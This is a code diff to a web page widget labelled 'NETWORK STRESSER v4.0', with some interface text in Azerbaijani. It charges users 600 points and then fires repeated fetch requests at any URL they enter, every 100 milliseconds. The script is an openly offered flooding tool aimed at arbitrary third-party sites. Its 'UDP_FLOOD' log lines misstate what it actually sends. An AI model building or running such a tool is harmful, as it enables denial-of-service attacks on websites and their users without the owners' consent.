@@ -1,20 +1,59 @@
-<div style="color:white; padding:20px; text-align:center;">
-    <h3 style="color:#00ff00; font-family:'Syncopate';">DDOS STRESSER</h3>
-    <input type="text" id="target-url" placeholder="https://target.com" style="width:100%; padding:15px;">
-    <button onclick="startAttack()" id="at-btn" style="width:100%; margin-top:10px; background:#ff0000; color:white; border:none; padding:15px; font-weight:900;">HÜCUMU BAŞLAT (600 PTS)</button>
-    <div id="logs" style="height:150px; overflow-y:auto; background:#000; font-family:monospace; margin-top:20px; padding:10px; font-size:10px; text-align:left;"></div>
+<div id="ddos-container" style="color: #ff0000; font-family: 'Courier New', monospace; padding: 20px; text-align: center;">
+    <div class="radar-box" style="position: relative; width: 100px; height: 100px; margin: 0 auto 20px; border: 2px solid #ff0000; border-radius: 50%; overflow: hidden;">
+        <div class="radar-line" style="position: absolute; width: 100%; height: 100%; background: linear-gradient(0deg, transparent 50%, rgba(255,0,0,0.2) 50%); animation: radar-spin 2s linear infinite;"></div>
+        <i class="fas fa-crosshairs" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 1.5rem; opacity: 0.5;"></i>
+    </div>
+
+    <h3 style="font-family: 'Syncopate'; letter-spacing: 3px; margin-bottom: 20px;">NETWORK STRESSER v4.0</h3>
+    
+    <input type="text" id="target-url" placeholder="https://target-site.com" 
+        style="width: 100%; padding: 15px; background: #000; border: 1px solid #ff0000; color: #ff0000; text-align: center; border-radius: 5px; outline: none; font-weight: bold;">
+    
+    <button onclick="startAttack()" id="at-btn" 
+        style="width: 100%; margin-top: 15px; padding: 18px; background: #ff0000; color: black; border: none; font-weight: 900; cursor: pointer; border-radius: 5px; box-shadow: 0 0 20px rgba(255,0,0,0.4);">
+        FLOOD ATTACK START (600 PTS)
+    </button>
+
+    <div id="ddos-logs" style="height: 150px; overflow-y: auto; background: rgba(255,0,0,0.05); margin-top: 20px; padding: 15px; font-size: 11px; text-align: left; border: 1px solid #300; scroll-behavior: smooth;">
+        [SYSTEM]: System ready. Waiting for target...
+    </div>
 </div>
+
+<style>
+    @keyframes radar-spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+    .packet-log { border-left: 2px solid #ff0000; padding-left: 10px; margin-bottom: 5px; animation: logSlide 0.2s ease; }
+    @keyframes logSlide { from { transform: translateX(-10px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+    .screen-shake { animation: shake 0.1s infinite; }
+    @keyframes shake { 0% { transform: translate(1px, 1px) rotate(0deg); } 50% { transform: translate(-1px, -2px) rotate(-1deg); } 100% { transform: translate(1px, -1px) rotate(1deg); } }
+</style>
+
 <script>
-let attack = false;
-function startAttack() {
+let attackActive = false;
+async function startAttack() {
     const target = document.getElementById('target-url').value;
-    if(!target.startsWith('http')) return alert("Tam URL yazın!");
-    attack = true;
-    document.getElementById('at-btn').innerText = "HÜCUM DAVAM EDİR...";
+    if(!target.startsWith('http')) return alert("Tam URL daxil edin!");
+
+    const user = localStorage.getItem('elite_session');
+    const snap = await db.ref('users/' + user).get();
+    if((snap.val().points || 0) < 600) return alert("PTS kifayət deyil!");
+
+    // Xalı çıx və hücumu başlat
+    db.ref('users/' + user).update({ points: snap.val().points - 600 });
+    
+    attackActive = true;
+    document.getElementById('at-btn').innerText = "HÜCUM EDİLİR...";
+    document.getElementById('ddos-container').classList.add('screen-shake');
+    
+    const logs = document.getElementById('ddos-logs');
+
     setInterval(() => {
-        if(!attack) return;
-        fetch(target, { mode: 'no-cors' }).catch(e => {});
-        document.getElementById('logs').innerHTML += `[SEND]: Packet sent to ${target} <br>`;
-    }, 50);
+        if(!attackActive) return;
+        fetch(target, { mode: 'no-cors' }).catch(() => {});
+        const log = document.createElement('div');
+        log.className = 'packet-log';
+        log.innerHTML = `[UDP_FLOOD]: Packet ${Math.floor(Math.random()*99999)} sent to ${target} -> <span style="color:#0f0">SENT</span>`;
+        logs.appendChild(log);
+        logs.scrollTop = logs.scrollHeight;
+    }, 100);
 }
 </script>
